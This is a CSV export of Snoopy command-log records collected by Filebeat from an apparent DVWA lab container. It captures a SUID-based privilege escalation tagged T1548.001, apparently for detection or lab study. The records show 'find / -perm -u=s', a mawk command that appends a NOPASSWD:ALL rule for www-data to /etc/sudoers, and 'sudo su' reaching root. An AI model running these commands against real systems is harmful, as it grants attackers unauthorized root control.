"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version",command,cwd,"ecs.version","event.dataset","event.ingested",filename,"host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,sid,tty,uid
"Oct 24, 2022 @ 23:21:48.560",49aVCoQBDsc6tFfS8NL6,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/bin/bash -i","/var/www","8.0.0",snoopy,"Oct 24, 2022 @ 23:21:49.562","/bin/bash","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","642,269","[uid:33 sid:256075 tty:/dev/pts/0 cwd:/var/www filename:/bin/bash]: /bin/bash -i",256075,"/dev/pts/0",33
"Oct 24, 2022 @ 23:21:34.557",4daVCoQBDsc6tFfSus5I,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","su - www-data","/var/www/html","8.0.0",snoopy,"Oct 24, 2022 @ 23:21:35.559","/bin/su","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","641,963","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/var/www/html filename:/bin/su]: su - www-data",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:21:34.557",4taVCoQBDsc6tFfSus5I,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-sh","/var/www","8.0.0",snoopy,"Oct 24, 2022 @ 23:21:35.559","/bin/sh","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","642,047","[uid:33 sid:256075 tty:/dev/pts/0 cwd:/var/www filename:/bin/sh]: -sh",256075,"/dev/pts/0",33
"Oct 24, 2022 @ 23:21:34.557",49aVCoQBDsc6tFfSus5I,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","id -u","/var/www","8.0.0",snoopy,"Oct 24, 2022 @ 23:21:35.559","/usr/bin/id","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","642,117","[uid:33 sid:256075 tty:/dev/pts/0 cwd:/var/www filename:/usr/bin/id]: id -u",256075,"/dev/pts/0",33
"Oct 24, 2022 @ 23:21:34.557",5NaVCoQBDsc6tFfSus5I,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","id -u","/var/www","8.0.0",snoopy,"Oct 24, 2022 @ 23:21:35.559","/usr/bin/id","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","642,193","[uid:33 sid:256075 tty:/dev/pts/0 cwd:/var/www filename:/usr/bin/id]: id -u",256075,"/dev/pts/0",33
"Oct 24, 2022 @ 23:21:10.554","-taVCoQBDsc6tFfSXMqE",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","./exploit_suid_binary.sh","/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:21:11.556","./exploit_suid_binary.sh","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","641,211","[uid:33 sid:238862 tty:(none) cwd:/exploits/Privilege_Escalation_T1548.001 filename:./exploit_suid_binary.sh]: ./exploit_suid_binary.sh",238862,"(none)",33
"Oct 24, 2022 @ 23:21:10.554","-9aVCoQBDsc6tFfSXMqE",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","find / -perm -u=s -type f","/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:21:11.556","/usr/bin/find","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","641,347","[uid:33 sid:238862 tty:(none) cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/find]: find / -perm -u=s -type f",238862,"(none)",33
"Oct 24, 2022 @ 23:21:10.554","_NaVCoQBDsc6tFfSXMqE",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","mawk -v LFILE=/etc/sudoers BEGIN { print ""www-data ALL=(ALL) NOPASSWD:ALL"" >> LFILE }","/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:21:11.556","/usr/bin/mawk","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","641,473","[uid:33 sid:238862 tty:(none) cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/mawk]: mawk -v LFILE=/etc/sudoers BEGIN { print ""www-data ALL=(ALL) NOPASSWD:ALL"" >> LFILE }",238862,"(none)",33
"Oct 24, 2022 @ 23:21:10.554","_daVCoQBDsc6tFfSXMqE",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","sudo su","/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:21:11.556","/usr/bin/sudo","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","641,659","[uid:33 sid:238862 tty:(none) cwd:/exploits/Privilege_Escalation_T1548.001 filename:/usr/bin/sudo]: sudo su",238862,"(none)",33
"Oct 24, 2022 @ 23:21:10.554","_taVCoQBDsc6tFfSXMqE",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",su,"/exploits/Privilege_Escalation_T1548.001","8.0.0",snoopy,"Oct 24, 2022 @ 23:21:11.556","/bin/su","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","641,767","[uid:0 sid:238862 tty:(none) cwd:/exploits/Privilege_Escalation_T1548.001 filename:/bin/su]: su",238862,"(none)",0
